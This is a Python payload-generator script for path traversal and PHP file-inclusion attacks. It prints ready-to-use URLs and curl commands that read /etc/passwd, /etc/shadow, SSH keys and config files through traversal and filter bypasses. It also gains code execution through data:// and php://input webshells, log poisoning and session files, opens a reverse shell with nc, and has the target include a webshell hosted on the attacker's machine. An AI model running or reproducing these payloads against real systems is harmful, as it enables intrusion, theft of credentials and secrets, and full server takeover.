#!/usr/bin/env python3
"""PATH/DIRECTORY TRAVERSAL + LOCAL/REMOTE FILE INCLUSION -> file read and RCE. PRINTS payloads.

Usage:
  python3 gen_lfi.py read   [--param page] [--file /etc/passwd]   # traversal + read primitives + bypasses
  python3 gen_lfi.py rce                                          # LFI -> code execution techniques
  python3 gen_lfi.py rfi                                          # remote file inclusion (if allow_url_include)
"""
import sys
import _web_common as P

def opt(flag, default=None):
    return sys.argv[sys.argv.index(flag) + 1] if flag in sys.argv else default

arg   = sys.argv[1] if len(sys.argv) > 1 else "read"
param = opt("--param", "page")
tfile = opt("--file", "/etc/passwd")

if arg == "read":
    print(f"# PATH TRAVERSAL / LFI file read   param={param}")
    print(f"# needs: a param whose value is used as a FILE PATH by the app (page=, file=, include=, template=, lang=).")
    print(f"# basic traversal (try in this order — plain first, add encoding/bypass only if it's filtered):")
    print(f"{P.TURL}/?{param}=../../../../../../{tfile.lstrip('/')}                # (try first) plain traversal  -> ok: file contents (e.g. root:x:0:0 for /etc/passwd)")
    print(f"{P.TURL}/?{param}=....//....//....//{tfile.lstrip('/')}      # if plain is stripped: nested ../ filter bypass")
    print(f"{P.TURL}/?{param}=%2e%2e%2f%2e%2e%2f{P.url(tfile)}           # URL-encoded")
    print(f"{P.TURL}/?{param}=..%252f..%252f{tfile.lstrip('/')}         # double-encoded (WAF)")
    print(f"{P.TURL}/?{param}=../../{tfile.lstrip('/')}%00               # null byte (only old PHP <5.3.4)")
    print(f"# PHP wrappers (read source / base64) — needs: a PHP target that leaves php:// wrappers enabled:")
    print(f"{P.TURL}/?{param}=php://filter/convert.base64-encode/resource=index.php   # -> ok: a base64 blob; pipe to base64 -d to read the raw PHP source")
    print(f"{P.TURL}/?{param}=php://filter/read=string.rot13/resource=config.php")
    print(f"# high-value targets: /etc/passwd · /etc/shadow · app config (DB creds!) · /proc/self/environ ·")
    print(f"#   ~/.ssh/id_rsa · web.config · C:\\Windows\\win.ini · IIS/apache logs · .env · settings.py")
    print(f"# Windows:  ..\\..\\..\\windows\\win.ini   (or / separators)")

elif arg == "rce":
    print(f"# LFI -> RCE — needs: a confirmed PHP LFI ({param} = the include param). Pick the primitive the target exposes.")
    print(f"# ordering: data:// and php://input are cleanest IF allow_url_include is on; else fall back to log poisoning / session.")
    print(f"# 1) PHP data:// wrapper (needs: allow_url_include=On) — try first if enabled:")
    print(f"{P.TURL}/?{param}=data://text/plain;base64,{P.b64(P.WEBSHELL['php'])}   # then &c=id   -> ok: id output = code runs")
    print(f"# 2) php://input (needs: allow_url_include=On) — POST the PHP body:")
    print(f"curl '{P.TURL}/?{param}=php://input' --data '<?php system($_GET[0]);?>' -G --data-urlencode '0=id'   # -> ok: id output")
    print(f"# 3) LOG POISONING (needs: a log file you can include AND write to) — inject PHP into a log, then include it:")
    print(f"curl '{P.TURL}/' -A '<?php system($_GET[0]);?>'      # step A: poison access.log via User-Agent")
    print(f"{P.TURL}/?{param}=/var/log/apache2/access.log&0=id   # step B: include it  -> ok: id output appears in the page")
    print(f"#   also poison: /var/log/auth.log (ssh user '<?php...?>'), /proc/self/environ (UA), mail, /var/log/vsftpd.log")
    print(f"# 4) PHP session file (needs: readable session path + a param stored in $_SESSION) — include the session:")
    print(f"{P.TURL}/?{param}=/var/lib/php/sessions/sess_<PHPSESSID>&0=id   # <PHPSESSID> = your session cookie value")
    print(f"# 5) phpinfo() race (if a phpinfo page exists) · zip:// / phar:// deserialization for modern PHP.")
    print(f"# -> once code runs: &0=<urlencoded {P.revshell('bash')}>  (or bash64) -> nc -lvnp {P.LPORT}")

elif arg == "rfi":
    print(f"# REMOTE FILE INCLUSION — needs: allow_url_include=On (rare) AND the target can reach your box.")
    print(f"echo '{P.WEBSHELL_PHP_NQ}' > shell.txt && python3 -m http.server 80   # step A: host the payload on {P.LHOST}")
    print(f"{P.TURL}/?{param}=http://{P.LHOST}/shell.txt&c=id                       # step B: include it  -> ok: your http.server logs a GET /shell.txt AND the page returns id output")
    print(f"# also works with ftp:// and SMB (\\\\{P.LHOST}\\share\\shell.php) on some stacks.")
else:
    print("use: read | rce | rfi"); sys.exit(1)
